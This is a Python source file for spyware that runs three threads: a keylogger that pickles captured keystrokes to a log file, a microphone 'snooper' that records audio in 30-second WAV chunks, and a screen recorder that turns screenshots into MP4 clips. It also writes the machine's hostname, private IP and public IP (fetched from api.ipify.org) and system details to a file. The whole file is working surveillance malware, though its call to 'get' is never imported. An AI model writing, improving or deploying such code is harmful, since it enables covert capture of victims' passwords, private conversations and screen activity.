import time, sounddevice, os, pickle, glob, socket, platform, moviepy.video.io.ImageSequenceClip

from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from PIL import ImageGrab
from threading import Thread

main_path = os.path.dirname(os.path.realpath(__file__))

CLEAR_LOGS = True
CLEAN_UP = True
CLEAR_RECORDINGS = True
KEYLOGGER_ENABLED = True
MICROPHONE_SNOOPER_ENABLED = True
SCREEN_RECORDER_ENABLED = True

INPUT_UPDATE_INTERVAL = 25
TIME_UPDATE_INTERVAL = 30
MIC_SAMPLERATE = 44100
RECORDER_FRAME_LIMIT = 50
FPS = 2

PATH = main_path + r"\\resources\\"
TEMP = PATH + r"temp\\"
RECORDINGS = PATH + r"recordings\\"
MIC_RECORDINGS = PATH + r"mic-recordings\\"
run = True
count = 0
keys = []

current_time = time.time()
stopping_time = time.time() + TIME_UPDATE_INTERVAL

audio_information = "microphone.wav"
screen_name = "screen"
image_file_extension = ".png"

def get_machine_info():
    with open(PATH + "info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def clean_up():
    files = glob.glob(TEMP+"*")
    for f in files:
        os.remove(f)

def clear_recordings():
    files = glob.glob(RECORDINGS+"*")
    for f in files:
        os.remove(f)

def clear_logs():
    logs = ""
    main_path = os.path.dirname(os.path.realpath(__file__))

    TEMP_PATH = f"{main_path}/resources/"
    with open(f"{TEMP_PATH}/log.txt", "wb") as f:
        pickle.dump(logs, f)  

#KEYLOGGER #################################################################################################
def on_press(key):
    global keys, count, current_time

    current_time = time.time()
    keys.append(key)
    count += 1
    if count > INPUT_UPDATE_INTERVAL:
        write_file(keys)
        count = 0   
        keys = []

def write_file(keys):
    with open(f'{PATH}/log.txt', 'rb') as f:
        logs = pickle.load(f)

    for key in keys:
        k = str(key).replace("'","")                   
        if k.find("space") > 0:
            logs = logs + " "
        elif k.find("Key") == -1:
            logs = logs + k
    print(logs)
    with open(f"{PATH}/log.txt", "wb") as f:
        pickle.dump(logs, f)  
    logs = []
    
def on_release(key):
    if key == Key.esc:      
        return False
    if current_time > stopping_time:
        return False

def keylogger():
    run = True
    while run:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

#KEYLOGGER #################################################################################################

def microphone_snooper():
    global stopping_time, TIME_UPDATE_INTERVAL
    run = True
    mic_count = 0
    while run:
        current_time = time.time()
        if current_time > stopping_time:
            current_time = time.time()
            stopping_time = time.time() + TIME_UPDATE_INTERVAL
            fs = MIC_SAMPLERATE
            seconds = TIME_UPDATE_INTERVAL
            myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
            sounddevice.wait()
            mic_count += 1
            write(MIC_RECORDINGS + f"microphone{str(mic_count)}.wav", fs, myrecording)

def screen_recorder():
    global TIME_UPDATE_INTERVAL, FPS
    run = True

    frame_buffer = []
    frame_count = 0
    mov_count = 0
    while run:
        frame = ImageGrab.grab()
        frame_count += 1
        frame.save(TEMP + screen_name+str(frame_count)+image_file_extension)

        if frame_count > RECORDER_FRAME_LIMIT:
            image_files = [TEMP+img for img in os.listdir(TEMP) if img.endswith(".png")]
            clip = moviepy.video.io.ImageSequenceClip.ImageSequenceClip(image_files, fps=int(FPS))
            clip.write_videofile(f"{RECORDINGS}screen{mov_count}.mp4")
            mov_count += 1
            frame_count = 0
            clean_up()

if CLEAN_UP:
    clean_up()
if CLEAR_LOGS:
    clear_logs()
if CLEAR_RECORDINGS:
    clear_recordings()

print("[SYSTEM] Running")
get_machine_info()

if __name__ == '__main__':
    if KEYLOGGER_ENABLED:
        Thread(target = keylogger).start()
    if MICROPHONE_SNOOPER_ENABLED:
        Thread(target = microphone_snooper).start()
    if SCREEN_RECORDER_ENABLED:
        Thread(target = screen_recorder).start()
